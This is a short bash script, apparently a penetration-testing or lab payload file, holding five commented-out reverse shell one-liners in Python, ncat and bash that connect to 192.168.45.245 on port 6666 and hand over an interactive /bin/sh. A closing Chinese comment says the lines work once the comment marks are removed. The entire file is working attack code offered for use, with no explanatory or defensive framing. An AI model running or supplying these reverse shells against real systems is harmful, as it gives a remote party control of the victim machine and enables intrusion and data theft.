#!/bin/bash

#python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.45.245",6666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

#python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.45.245",6666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

#ncat 192.168.45.245 6666 -e /bin/sh

#bash -c "bash -i >&/dev/tcp/192.168.45.245/6666 0>&1"

#bash -i >&/dev/tcp/192.168.45.245/6666 0>&1



#把註記拿掉即可使用
